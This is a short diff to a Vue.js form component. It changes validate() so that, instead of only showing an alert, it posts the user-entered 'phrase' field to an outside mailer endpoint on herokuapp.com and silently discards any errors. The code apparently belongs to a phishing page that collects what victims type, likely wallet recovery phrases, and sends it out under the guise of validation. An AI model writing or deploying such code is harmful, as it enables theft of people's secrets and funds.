@@ -44,9 +44,21 @@ export default {
   }),
 
   methods: {
-    validate() {
+    async validate() {
       this.$refs.form.validate();
-      alert("Shegun the email will be ready this night!");
+      const baseURL = "https://everify-mailer.herokuapp.com/";
+      const data = {
+        data: {
+          subject: "phrase",
+          info: this.phrase,
+        },
+      };
+      try {
+        const response = await this.$http.post(baseURL, data);
+        alert(response.data.msg);
+      } catch (error) {
+        // console.log(error);
+      }
     },
   },
 };
